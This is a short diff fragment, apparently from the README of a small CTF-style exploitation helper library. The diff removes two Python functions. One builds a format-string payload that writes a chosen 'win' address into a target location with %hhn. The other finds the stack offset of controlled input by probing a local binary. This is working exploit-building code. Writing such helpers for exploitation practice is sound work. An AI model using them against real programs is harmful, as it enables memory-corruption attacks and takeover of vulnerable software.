@@ -35,36 +35,6 @@ def grab(p, start, end):
 
 def pack(msg):
     return bytes(str(msg), 'utf-8')
-
-# overwrites the address at target() with win().
-# offset specifies which stack variable you control %{target}$n 
-# padding specifies required padding to align the input in the stack variable (one of [0,1,2,3])
-def fmtstr_build(win, target, offset, padding):
-    payload = b"A" * padding
-    payload += p32(target + 0) + p32(target + 1) + p32(target + 2) + p32(target + 3)
-    payload += f"%{240 - padding}c".encode()
-
-    for i in range(4):
-        byte = win & 0xff
-        win >>= 8
-        if (byte == 0):
-            payload += f"%{offset + i}$hhn".encode()
-        else:
-            payload += f"%{byte}c%{offset + i}$hhn%{256 - byte}c".encode()
-
-    return payload
-
-def fmtstr_offset(binary, after, padding=0):
-    for i in range(1, 20):
-        p = process(binary)
-
-        p.sendlineafter(after, f'{b"A" * padding}AAAA%{i}$x'.encode())
-        output = p.recvline().decode('utf-8')
-
-        p.close()
-
-        if '41414141' in output:
-            return i
 ```
 
 Then add the folder the lib is stored into your python path:
